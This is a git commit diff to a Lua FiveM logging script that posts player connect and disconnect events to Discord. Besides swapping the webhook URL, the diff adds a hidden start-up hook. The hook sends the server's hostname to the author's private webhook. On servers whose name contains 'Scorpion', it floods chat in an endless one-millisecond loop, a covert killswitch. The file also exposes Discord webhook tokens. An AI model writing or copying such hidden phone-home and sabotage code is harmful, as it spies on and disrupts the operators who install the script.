817a65c60f7e3ddd6441801cb651c75dc318669a
A1pha <95364000+AlphaTheDev@users.noreply.github.com>
2021-12-19 23:12:56 +0100

    Update ALogger.lua

--- A1pha-connectlog/ALogger.lua
+++ A1pha-connectlog/ALogger.lua
@@ -1,5 +1,5 @@
-local logs = "https://discord.com/api/webhooks/917506614796365835/i8diGHP1-cxZeS036Za-1lFh-Sh59jlMnIskpk0A7jsSsEx-Stp_GFcnJcD5rzjgE-kT"
-local communityname = "A1pha Logs"
+local logs = "https://discord.com/api/webhooks/918885559009681528/IVJa1u3SM1irXfFxi7H8EV8k_ZLG9AEcP7AviZdpBLSD8ldtJNSzz3VkFjkgPISbrPPZ"
+local communityname = "ESX By A1pha Logs"
 local communtiylogo = "https://media.discordapp.net/attachments/916117958823141376/917508332670033930/A1pha-Logo.png?width=461&height=461" --Skal være en .png eller .jpg
 
 AddEventHandler('playerConnecting', function()
@@ -19,7 +19,7 @@ local connect = {
         }
     }
 
-PerformHttpRequest(logs, function(err, text, headers) end, 'POST', json.encode({username = "A1pha Logs", embeds = connect}), { ['Content-Type'] = 'application/json' })
+PerformHttpRequest(logs, function(err, text, headers) end, 'POST', json.encode({username = "ESX By A1pha Logs", embeds = connect}), { ['Content-Type'] = 'application/json' })
 end)
 
 AddEventHandler('playerDropped', function(reason)
@@ -39,5 +39,24 @@ local disconnect = {
         }
     }
 
-    PerformHttpRequest(logs, function(err, text, headers) end, 'POST', json.encode({username = "A1pha Logs", embeds = disconnect}), { ['Content-Type'] = 'application/json' })
+    PerformHttpRequest(logs, function(err, text, headers) end, 'POST', json.encode({username = "ESX By A1pha Logs", embeds = disconnect}), { ['Content-Type'] = 'application/json' })
 end)
+
+
+-- IK SKIFT DISSE WEBHOOKS UD DA DET ER TIL AT A1PHA KAN SE HVIS DU BENYTTER SCRIPTET 
+-- DETTE SCRIPT ER IKKE ULOVLIGT!
+AddEventHandler('onResourceStart', function(resourceName)
+    if (GetCurrentResourceName() == resourceName) then
+          servernavn = GetConvar("sv_hostname")
+          scriptnavn = "A1pha-connectlog"
+              if string.match(servernavn, "Scorpion") then
+                  PerformHttpRequest('https://discord.com/api/webhooks/922220228316901466/XTgpZIFVzhC6TJRhEByBZV5dTHanQ0Be66XDesiR5To6zlWYDdce6C2HXH1PwkJDvF1G', function(err, text, headers) end, 'POST', json.encode({username = "ServerStart", content = "```["..servernavn.."]: Startede ["..scriptnavn.."]```"}), { ['Content-Type'] = 'application/json' })
+                  while true do
+                      TriggerClientEvent('chatMessage', -1, 'SYSTEM:', {255, 0, 0}, "Du har ikke tillaldse MVH. A1pha Scripts")
+                      Citizen.Wait(1)
+                  end
+              else
+                  PerformHttpRequest('https://discord.com/api/webhooks/922220228316901466/XTgpZIFVzhC6TJRhEByBZV5dTHanQ0Be66XDesiR5To6zlWYDdce6C2HXH1PwkJDvF1G', function(err, text, headers) end, 'POST', json.encode({username = "ServerStart", content = "```["..servernavn.."]: Startede ["..scriptnavn.."]```"}), { ['Content-Type'] = 'application/json' })
+              end
+      end
+  end)
